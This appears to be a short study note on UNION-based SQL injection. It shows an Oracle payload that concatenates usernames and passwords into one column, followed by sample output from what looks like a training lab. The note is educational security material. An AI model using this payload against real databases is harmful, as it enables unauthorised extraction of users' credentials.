# Retrieving multiple values within a single column
#UNION 

If a result set only returns one column, retrieve multiple values by concatenating the values together. Ideally place a suitable separator that allow to distinguish the values.

## Oracle example

Injecting this payload

```SQL
' UNION SELECT username || '~' || password FROM users--
```

Will generate the following output

`username`~`password`

```
administrator~s3cure 
wiener~peter 
carlos~montoya
```

Different <font color="yellow">databases</font> use different <font color="green">syntax</font> to perform string concatenation.

# Exploitation
